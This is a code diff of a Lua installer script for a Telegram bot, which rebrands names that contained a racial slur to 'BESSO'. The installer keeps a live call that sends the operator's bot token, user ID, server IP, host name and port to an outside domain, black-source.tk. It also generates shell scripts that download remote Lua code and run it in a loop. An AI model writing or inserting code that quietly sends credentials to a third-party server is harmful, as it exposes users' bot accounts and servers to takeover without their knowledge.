@@ -16,9 +16,9 @@ local Create_Info = function(Token,Sudo)
 local Write_Info_Sudo = io.open("sudo.lua", 'w')
 Write_Info_Sudo:write([[
 
-s = "ZZZZD"
+s = "FSFFF"
 
-q = "NiGGa_SoUrcE"
+q = "BESSO_SoUrcE"
 
 token = "]]..Token..[["
 
@@ -67,27 +67,27 @@ end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://black-source.tk/BlackTeAM/index.php?n=NAG&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
-local RunBot = io.open("NiggA", 'w')
+local RunBot = io.open("BESSO", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
 cd $HOME/DEV-NAG
 token="]]..database:get(Server_Done.."Token_Write")..[["
-rm -fr NiggA.lua
-wget "https://raw.githubusercontent.com/DEV-NAG/DEV-NAG/main/NiggA.lua"
+rm -fr BESSO.lua
+wget "https://raw.githubusercontent.com/planthertech/BESSO/main/BESSO.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./NiggA.lua -p PROFILE --bot=$token
+./tg -s ./BESSO.lua -p PROFILE --bot=$token
 done
 ]])
 RunBot:close()
-local RunTs = io.open("NG", 'w')
+local RunTs = io.open("BE", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
 cd $HOME/DEV-NAG
 while(true) do
 rm -fr ../.telegram-cli
-screen -S NiggA -X kill
-screen -S NiggA ./NiggA
+screen -S BESSO -X kill
+screen -S BESSO ./BESSO
 done
 ]])
 RunTs:close()
